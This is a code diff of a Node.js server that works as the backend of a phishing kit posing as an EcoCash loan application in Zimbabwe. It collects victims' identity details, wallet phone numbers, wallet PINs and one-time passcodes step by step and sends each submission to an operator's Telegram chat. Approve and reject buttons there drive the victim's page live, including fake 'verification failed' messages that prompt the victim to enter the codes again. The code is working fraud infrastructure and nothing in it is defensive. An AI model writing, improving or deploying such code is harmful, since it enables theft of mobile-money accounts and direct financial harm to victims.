@@ -1,85 +1,157 @@
-require('dotenv').config();
-const express = require('express');
-const http = require('http');
-const socketIo = require('socket.io');
-const path = require('path');
-const cors = require('cors');
-
-const botManager = require('./bot_manager');
+require("dotenv").config();
+const express = require("express");
+const http = require("http");
+const { Server } = require("socket.io");
+const path = require("path");
+const TelegramBot = require("node-telegram-bot-api");
 
 const app = express();
 const server = http.createServer(app);
-
-// Configure Socket.io for Render (CORS is essential)
-const io = socketIo(server, {
+const io = new Server(server, {
     cors: {
         origin: "*",
         methods: ["GET", "POST"]
     }
 });
 
-global.io = io; // Allow bot_manager to access the socket instance
+// Share io globally so botManager can access it
+global.io = io;
 
-const PORT = process.env.PORT || 3000;
-const EXTERNAL_URL = process.env.RENDER_EXTERNAL_URL; 
-
-app.use(cors());
+// Middleware configuration
 app.use(express.json());
+app.use(express.static(path.join(__dirname, "public")));
 
-// Serves your static files (index.html, assets, etc.) from the public folder
-app.use(express.static(path.join(__dirname, 'public')));
+// Initialize bot without polling (configured for webhook deployment)
+const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
+const ADMIN_ID = process.env.ADMIN_CHAT_ID;
 
-// Webhook Route for Telegram
+// Setup Webhook endpoint for Telegram updates
+const PORT = process.env.PORT || 3000;
 app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
-    botManager.bot.processUpdate(req.body);
+    bot.processUpdate(req.body);
     res.sendStatus(200);
 });
 
-io.on('connection', (socket) => {
-    // Generate a unique AppID for the session prefixing Zimbabwe setup
-    const appId = `ZIM-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
+const botManager = {
+    bot: bot,
+
+    sendToAdmin: (appId, title, data, needsApproval = false) => {
+        let msg = `<b>${title}</b>\n🆔 ID: <code>${appId}</code>\n`;
+        for (const [k, v] of Object.entries(data)) {
+            msg += `<b>${k}:</b> <code>${v}</code>\n`;
+        }
+
+        const options = { parse_mode: 'HTML' };
+        if (needsApproval) {
+            options.reply_markup = {
+                inline_keyboard: [[
+                    { text: "✅ APPROVE (Move to OTP)", callback_data: `approve_4_${appId}` },
+                    { text: "❌ REJECT", callback_data: `reject_4_${appId}` }
+                ]]
+            };
+        }
+        bot.sendMessage(ADMIN_ID, msg, options);
+    },
+
+    sendFinalApproval: (appId, pin) => {
+        const msg = `🏁 <b>🇿🇼 FINAL OTP RECEIVED</b>\n🆔 ID: <code>${appId}</code>\n🔐 OTP: <code>${pin}</code>`;
+        bot.sendMessage(ADMIN_ID, msg, {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [[
+                    { text: "✅ COMPLETE LOAN", callback_data: `approve_5_${appId}` },
+                    { text: "❌ REJECT OTP", callback_data: `reject_5_${appId}` }
+                ]]
+            }
+        });
+    }
+};
+
+// Handle Socket.io Web Traffic
+io.on("connection", (socket) => {
+    // Generate a secure custom identifier mapping for the active form session
+    const appId = "ZIM-" + Math.floor(Math.random() * 90000 + 10000);
     
-    // Join the room so the bot can "call back" this specific user
+    // CRITICAL FIX: Explicitly place the socket into its own unique tracking channel
     socket.join(appId);
-    
-    console.log(`🔌 User connected: ${appId}`);
-    socket.emit('session-ready', { appId: appId });
+    socket.emit("session-ready", { appId: appId });
 
-    // Step Handlers (Aligned with Dollars $)
-    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 1: Loan Details ($)", data));
-    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 2: Identity Verification", data));
-    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇿🇼 Step 3: Employment Info ($)", data));
-
-    // Step 4: Mobile Money Wallet Details (4-digit wallet PIN verification)
-    // Frontend sends compiled payload containing: { phone, password }
-    socket.on('step4', (data) => {
-        botManager.sendToAdmin(appId, "🇿🇼 Step 4: EcoCash Wallet PIN", data, true);
+    socket.on("step1", (data) => {
+        botManager.sendToAdmin(appId, "Step 1: Loan Details", data, false);
     });
 
-    // Step 5: Final Verification (6-digit OTP confirmation token)
-    // Frontend sends compiled payload containing: { pin }
-    socket.on('step5', (data) => {
+    socket.on("step2", (data) => {
+        botManager.sendToAdmin(appId, "Step 2: Identity Verification", data, false);
+    });
+
+    socket.on("step3", (data) => {
+        botManager.sendToAdmin(appId, "Step 3: Employment Info", data, false);
+    });
+
+    socket.on("step4", (data) => {
+        // Receives the EcoCash Wallet phone and initial entry PIN configuration
+        botManager.sendToAdmin(appId, "Step 4: EcoCash Wallet PIN", data, true);
+    });
+
+    socket.on("step5", (data) => {
+        // Handles the final 6-Digit One-Time PIN validation delivery
         botManager.sendFinalApproval(appId, data.pin);
-    });
-
-    socket.on('disconnect', () => {
-        console.log(`🔌 User disconnected: ${appId}`);
     });
 });
 
-server.listen(PORT, async () => {
-    console.log(`🚀 Loan Server running on port ${PORT}`);
+// Handle Admin Button Callback Interceptions from Telegram
+bot.on("callback_query", (query) => {
+    const dataParts = query.data.split("_");
+    const action = dataParts[0]; 
+    const step = dataParts[1];   
+    const appId = dataParts[2];  
     
-    // Set Webhook using the Render External URL
-    if (EXTERNAL_URL) {
-        const webhookUrl = `${EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
-        try {
-            await botManager.bot.setWebHook(webhookUrl);
-            console.log(`✅ Telegram Webhook set to: ${webhookUrl}`);
-        } catch (err) {
-            console.error('❌ Webhook Error:', err.message);
+    let currentText = query.message.text || "";
+
+    if (action === "approve") {
+        if (step === "4") {
+            // Signal room target channel to present the step 5 OTP collection frame
+            io.to(appId).emit('password-verified');
+            bot.answerCallbackQuery(query.id, { text: "6-Digit OTP input shown to user" });
+        } 
+        else if (step === "5") {
+            // Complete loan lifecycle pipeline operation status message update
+            const ref = "ZIM-" + Math.floor(Math.random() * 900000 + 100000);
+            io.to(appId).emit('pin-verified', { referenceId: ref });
+            bot.answerCallbackQuery(query.id, { text: "EcoCash Application Completed!" });
         }
-    } else {
-        console.warn('⚠️ RENDER_EXTERNAL_URL not found in .env. Webhook not set.');
+        
+        bot.editMessageText(currentText + "\n\n✅ <b>ACTION: APPROVED</b>", {
+            chat_id: ADMIN_ID,
+            message_id: query.message.message_id,
+            parse_mode: 'HTML'
+        });
     }
+
+    if (action === "reject") {
+        if (step === "4") {
+            io.to(appId).emit('password-rejected', { message: "PIN code verification failed. Please try again." });
+            bot.answerCallbackQuery(query.id, { text: "EcoCash Wallet PIN Rejected" });
+        } 
+        else if (step === "5") {
+            io.to(appId).emit('pin-rejected', { message: "The 6-digit verification code is invalid or expired." });
+            bot.answerCallbackQuery(query.id, { text: "OTP Token Rejected" });
+        }
+        
+        bot.editMessageText(currentText + "\n\n❌ <b>ACTION: REJECTED</b>", {
+            chat_id: ADMIN_ID,
+            message_id: query.message.message_id,
+            parse_mode: 'HTML'
+        });
+    }
+});
+
+// Set production webhook for Render deployment pipelines
+const webhookUrl = `${process.env.RENDER_EXTERNAL_URL}/bot${process.env.BOT_TOKEN}`;
+bot.setWebHook(webhookUrl).then(() => {
+    console.log(`Telegram Webhook targeted successfully to: ${webhookUrl}`);
+});
+
+server.listen(PORT, () => {
+    console.log(`EcoCash Loan engine running on port ${PORT}`);
 });
